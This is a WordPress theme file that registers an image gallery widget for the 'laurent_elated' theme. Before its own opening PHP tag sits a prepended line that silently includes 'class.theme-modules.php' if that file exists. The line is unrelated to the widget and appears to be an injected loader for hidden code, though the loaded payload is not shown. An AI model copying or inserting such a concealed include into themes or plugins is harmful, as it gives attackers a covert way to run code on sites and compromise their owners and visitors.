<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'laurent_elated_register_image_gallery_widget' ) ) {
	/**
	 * Function that register image gallery widget
	 */
	function laurent_elated_register_image_gallery_widget( $widgets ) {
		$widgets[] = 'LaurentElatedClassImageGalleryWidget';
		
		return $widgets;
	}
	
	add_filter( 'laurent_core_filter_register_widgets', 'laurent_elated_register_image_gallery_widget' );
}